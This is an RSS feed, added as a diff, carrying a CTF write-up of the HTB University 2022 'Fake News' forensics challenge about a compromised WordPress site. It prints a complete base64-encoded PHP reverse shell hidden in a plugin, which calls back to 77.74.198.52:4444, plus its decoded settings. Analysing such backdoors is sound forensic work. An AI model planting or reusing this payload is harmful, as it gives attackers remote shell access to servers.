@@ -1,0 +1,81 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
+  <channel>
+    <title>ctf on 0xlilith</title>
+    <link>/tags/ctf/</link>
+    <description>Recent content in ctf on 0xlilith</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <lastBuildDate>Mon, 05 Dec 2022 00:00:00 +0000</lastBuildDate><atom:link href="/tags/ctf/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Fake News Writeup</title>
+      <link>/posts/fake-news/</link>
+      <pubDate>Mon, 05 Dec 2022 00:00:00 +0000</pubDate>
+      
+      <guid>/posts/fake-news/</guid>
+      <description>Fake News Writeup - HTB University 2022 - CTF</description>
+      <content:encoded><![CDATA[<h2 id="description">Description</h2>
+<p><img loading="lazy" src="/images/fake-news/fake-news-description.png" type="" alt=""  />
+As the description says the site Magic informer was compromised by a hacker group &ldquo;Dark Pointy Hats&rdquo; from
+leaked credentials and used the site to host a phishing campaign.<br>
+We are provided with the root folder of the Magic informer site where we have to analyze the breach. So we begin with checking the content of the root folder.</p>
+<h2 id="hunting-the-hunter">Hunting The Hunter</h2>
+<p><img loading="lazy" src="/images/fake-news/root-folder.png" type="" alt=""  />
+We can already see the contents and get an idea that Wordpress is being used as the CMS.
+Wordpress can be compromised in many ways through some core vulnerability, vulnerable plugins, themes etc.
+But after some enumerations I found that the version of this wordpress was not vulnerable and neither was any themes that was used which leaves us with plugins.
+<img loading="lazy" src="/images/fake-news/pluggins.png" type="" alt=""  />
+Upon going through all three plugins, I found that the <code>plugin-manager.php</code> had a wried eval code that decodes some base64 encoding.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">eval</span><span class="p">(</span><span class="nx">base64_decode</span><span class="p">(</span><span class="s2">&#34;c2V0X3RpbWVfbGltaXQgKDApOwokVkVSU0lPTiA9ICIxLjAiOwokaXAgPSAnNzcuNzQuMTk4LjUyJzsgIC8vIENIQU5HRSBUSElTCiRwb3J0ID0gNDQ0NDsgICAgICAgLy8gQ0hBTkdFIFRISVMKJGNodW5rX3NpemUgPSAxNDAwOwokd3JpdGVfYSA9IG51bGw7CiRlcnJvcl9hID0gbnVsbDsKJHBhcnQxID0gIkhUQntDMG0zXzBuIjsKJHNoZWxsID0gJ3VuYW1lIC1hOyB3OyBpZDsgL2Jpbi9zaCAtaSc7CiRkYWVtb24gPSAwOwokZGVidWcgPSAwOwoKLy8KLy8gRGFlbW9uaXNlIG91cnNlbGYgaWYgcG9zc2libGUgdG8gYXZvaWQgem9tYmllcyBsYXRlcgovLwoKLy8gcGNudGxfZm9yayBpcyBoYXJkbHkgZXZlciBhdmFpbGFibGUsIGJ1dCB3aWxsIGFsbG93IHVzIHRvIGRhZW1vbmlzZQovLyBvdXIgcGhwIHByb2Nlc3MgYW5kIGF2b2lkIHpvbWJpZXMuICBXb3J0aCBhIHRyeS4uLgppZiAoZnVuY3Rpb25fZXhpc3RzKCdwY250bF9mb3JrJykpIHsKCS8vIEZvcmsgYW5kIGhhdmUgdGhlIHBhcmVudCBwcm9jZXNzIGV4aXQKCSRwaWQgPSBwY250bF9mb3JrKCk7CgkKCWlmICgkcGlkID09IC0xKSB7CgkJcHJpbnRpdCgiRVJST1I6IENhbid0IGZvcmsiKTsKCQlleGl0KDEpOwoJfQoJCglpZiAoJHBpZCkgewoJCWV4aXQoMCk7ICAvLyBQYXJlbnQgZXhpdHMKCX0KCgkvLyBNYWtlIHRoZSBjdXJyZW50IHByb2Nlc3MgYSBzZXNzaW9uIGxlYWRlcgoJLy8gV2lsbCBvbmx5IHN1Y2NlZWQgaWYgd2UgZm9ya2VkCglpZiAocG9zaXhfc2V0c2lkKCkgPT0gLTEpIHsKCQlwcmludGl0KCJFcnJvcjogQ2FuJ3Qgc2V0c2lkKCkiKTsKCQlleGl0KDEpOwoJfQoKCSRkYWVtb24gPSAxOwp9IGVsc2UgewoJcHJpbnRpdCgiV0FSTklORzogRmFpbGVkIHRvIGRhZW1vbmlzZS4gIFRoaXMgaXMgcXVpdGUgY29tbW9uIGFuZCBub3QgZmF0YWwuIik7Cn0KCi8vIENoYW5nZSB0byBhIHNhZmUgZGlyZWN0b3J5CmNoZGlyKCIvIik7CgovLyBSZW1vdmUgYW55IHVtYXNrIHdlIGluaGVyaXRlZAp1bWFzaygwKTsKCi8vCi8vIERvIHRoZSByZXZlcnNlIHNoZWxsLi4uCi8vCgovLyBPcGVuIHJldmVyc2UgY29ubmVjdGlvbgokc29jayA9IGZzb2Nrb3BlbigkaXAsICRwb3J0LCAkZXJybm8sICRlcnJzdHIsIDMwKTsKaWYgKCEkc29jaykgewoJcHJpbnRpdCgiJGVycnN0ciAoJGVycm5vKSIpOwoJZXhpdCgxKTsKfQoKLy8gU3Bhd24gc2hlbGwgcHJvY2VzcwokZGVzY3JpcHRvcnNwZWMgPSBhcnJheSgKICAgMCA9PiBhcnJheSgicGlwZSIsICJyIiksICAvLyBzdGRpbiBpcyBhIHBpcGUgdGhhdCB0aGUgY2hpbGQgd2lsbCByZWFkIGZyb20KICAgMSA9PiBhcnJheSgicGlwZSIsICJ3IiksICAvLyBzdGRvdXQgaXMgYSBwaXBlIHRoYXQgdGhlIGNoaWxkIHdpbGwgd3JpdGUgdG8KICAgMiA9PiBhcnJheSgicGlwZSIsICJ3IikgICAvLyBzdGRlcnIgaXMgYSBwaXBlIHRoYXQgdGhlIGNoaWxkIHdpbGwgd3JpdGUgdG8KKTsKCiRwcm9jZXNzID0gcHJvY19vcGVuKCRzaGVsbCwgJGRlc2NyaXB0b3JzcGVjLCAkcGlwZXMpOwoKaWYgKCFpc19yZXNvdXJjZSgkcHJvY2VzcykpIHsKCXByaW50aXQoIkVSUk9SOiBDYW4ndCBzcGF3biBzaGVsbCIpOwoJZXhpdCgxKTsKfQoKLy8gU2V0IGV2ZXJ5dGhpbmcgdG8gbm9uLWJsb2NraW5nCi8vIFJlYXNvbjogT2Njc2lvbmFsbHkgcmVhZHMgd2lsbCBibG9jaywgZXZlbiB0aG91Z2ggc3RyZWFtX3NlbGVjdCB0ZWxscyB1cyB0aGV5IHdvbid0CnN0cmVhbV9zZXRfYmxvY2tpbmcoJHBpcGVzWzBdLCAwKTsKc3RyZWFtX3NldF9ibG9ja2luZygkcGlwZXNbMV0sIDApOwpzdHJlYW1fc2V0X2Jsb2NraW5nKCRwaXBlc1syXSwgMCk7CnN0cmVhbV9zZXRfYmxvY2tpbmcoJHNvY2ssIDApOwoKcHJpbnRpdCgiU3VjY2Vzc2Z1bGx5IG9wZW5lZCByZXZlcnNlIHNoZWxsIHRvICRpcDokcG9ydCIpOwoKd2hpbGUgKDEpIHsKCS8vIENoZWNrIGZvciBlbmQgb2YgVENQIGNvbm5lY3Rpb24KCWlmIChmZW9mKCRzb2NrKSkgewoJCXByaW50aXQoIkVSUk9SOiBTaGVsbCBjb25uZWN0aW9uIHRlcm1pbmF0ZWQiKTsKCQlicmVhazsKCX0KCgkvLyBDaGVjayBmb3IgZW5kIG9mIFNURE9VVAoJaWYgKGZlb2YoJHBpcGVzWzFdKSkgewoJCXByaW50aXQoIkVSUk9SOiBTaGVsbCBwcm9jZXNzIHRlcm1pbmF0ZWQiKTsKCQlicmVhazsKCX0KCgkvLyBXYWl0IHVudGlsIGEgY29tbWFuZCBpcyBlbmQgZG93biAkc29jaywgb3Igc29tZQoJLy8gY29tbWFuZCBvdXRwdXQgaXMgYXZhaWxhYmxlIG9uIFNURE9VVCBvciBTVERFUlIKCSRyZWFkX2EgPSBhcnJheSgkc29jaywgJHBpcGVzWzFdLCAkcGlwZXNbMl0pOwoJJG51bV9jaGFuZ2VkX3NvY2tldHMgPSBzdHJlYW1fc2VsZWN0KCRyZWFkX2EsICR3cml0ZV9hLCAkZXJyb3JfYSwgbnVsbCk7CgoJLy8gSWYgd2UgY2FuIHJlYWQgZnJvbSB0aGUgVENQIHNvY2tldCwgc2VuZAoJLy8gZGF0YSB0byBwcm9jZXNzJ3MgU1RESU4KCWlmIChpbl9hcnJheSgkc29jaywgJHJlYWRfYSkpIHsKCQlpZiAoJGRlYnVnKSBwcmludGl0KCJTT0NLIFJFQUQiKTsKCQkkaW5wdXQgPSBmcmVhZCgkc29jaywgJGNodW5rX3NpemUpOwoJCWlmICgkZGVidWcpIHByaW50aXQoIlNPQ0s6ICRpbnB1dCIpOwoJCWZ3cml0ZSgkcGlwZXNbMF0sICRpbnB1dCk7Cgl9CgoJLy8gSWYgd2UgY2FuIHJlYWQgZnJvbSB0aGUgcHJvY2VzcydzIFNURE9VVAoJLy8gc2VuZCBkYXRhIGRvd24gdGNwIGNvbm5lY3Rpb24KCWlmIChpbl9hcnJheSgkcGlwZXNbMV0sICRyZWFkX2EpKSB7CgkJaWYgKCRkZWJ1ZykgcHJpbnRpdCgiU1RET1VUIFJFQUQiKTsKCQkkaW5wdXQgPSBmcmVhZCgkcGlwZXNbMV0sICRjaHVua19zaXplKTsKCQlpZiAoJGRlYnVnKSBwcmludGl0KCJTVERPVVQ6ICRpbnB1dCIpOwoJCWZ3cml0ZSgkc29jaywgJGlucHV0KTsKCX0KCgkvLyBJZiB3ZSBjYW4gcmVhZCBmcm9tIHRoZSBwcm9jZXNzJ3MgU1RERVJSCgkvLyBzZW5kIGRhdGEgZG93biB0Y3AgY29ubmVjdGlvbgoJaWYgKGluX2FycmF5KCRwaXBlc1syXSwgJHJlYWRfYSkpIHsKCQlpZiAoJGRlYnVnKSBwcmludGl0KCJTVERFUlIgUkVBRCIpOwoJCSRpbnB1dCA9IGZyZWFkKCRwaXBlc1syXSwgJGNodW5rX3NpemUpOwoJCWlmICgkZGVidWcpIHByaW50aXQoIlNUREVSUjogJGlucHV0Iik7CgkJZndyaXRlKCRzb2NrLCAkaW5wdXQpOwoJfQp9CgpmY2xvc2UoJHNvY2spOwpmY2xvc2UoJHBpcGVzWzBdKTsKZmNsb3NlKCRwaXBlc1sxXSk7CmZjbG9zZSgkcGlwZXNbMl0pOwpwcm9jX2Nsb3NlKCRwcm9jZXNzKTsKCi8vIExpa2UgcHJpbnQsIGJ1dCBkb2VzIG5vdGhpbmcgaWYgd2UndmUgZGFlbW9uaXNlZCBvdXJzZWxmCi8vIChJIGNhbid0IGZpZ3VyZSBvdXQgaG93IHRvIHJlZGlyZWN0IFNURE9VVCBsaWtlIGEgcHJvcGVyIGRhZW1vbikKZnVuY3Rpb24gcHJpbnRpdCAoJHN0cmluZykgewoJaWYgKCEkZGFlbW9uKSB7CgkJcHJpbnQgIiRzdHJpbmdcbiI7Cgl9Cn0=&#34;</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>After decodin it I found my first flag <code>HTB{C0m3_0n</code> also this plugin was being used to spwan a reverse shell to the server.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">set_time_limit (0);
+</span></span><span class="line"><span class="cl">$VERSION = &#34;1.0&#34;;
+</span></span><span class="line"><span class="cl">$ip = &#39;77.74.198.52&#39;;  // CHANGE THIS
+</span></span><span class="line"><span class="cl">$port = 4444;       // CHANGE THIS
+</span></span><span class="line"><span class="cl">$chunk_size = 1400;
+</span></span><span class="line"><span class="cl">$write_a = null;
+</span></span><span class="line"><span class="cl">$error_a = null;
+</span></span><span class="line"><span class="cl">$part1 = &#34;HTB{C0m3_0n&#34;;
+</span></span><span class="line"><span class="cl">$shell = &#39;uname -a; w; id; /bin/sh -i&#39;;
+</span></span><span class="line"><span class="cl">$daemon = 0;
+</span></span><span class="line"><span class="cl">$debug = 0;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="in-search-of-flag-part2">In Search of Flag: part2</h2>
+<p>After going through the root files one more time I found some weird obfuscated JS code in the <code>wp-blog/2022/11/index.php</code> which I spent alot of my time dobfuscating it just to find nothing. But I just wanted to see the working of that code so I hosted the blog and voila! we were provided with a download of <code>official_invitation.iso</code> file.</p>
+<p>I got an <code>official_invitation.exe</code> after checking the mount, which upon clicking showed me some interesting hidden files.
+<img loading="lazy" src="/images/fake-news/mounting.png" type="" alt=""  />
+<img loading="lazy" src="/images/fake-news/hidden-files.png" type="" alt=""  />
+And after analyzing and reading some strings we got our second part of the flag <code>_1t_w4s_t00_g00d_t0_b3_tru3}</code>
+<img loading="lazy" src="/images/fake-news/flag-part-2.png" type="" alt=""  /></p>
+<p>Flag : <code>HTB{C0m3_0n_1t_w4s_t00_g00d_t0_b3_tru3}</code></p>
+]]></content:encoded>
+    </item>
+    
+  </channel>
+</rss>
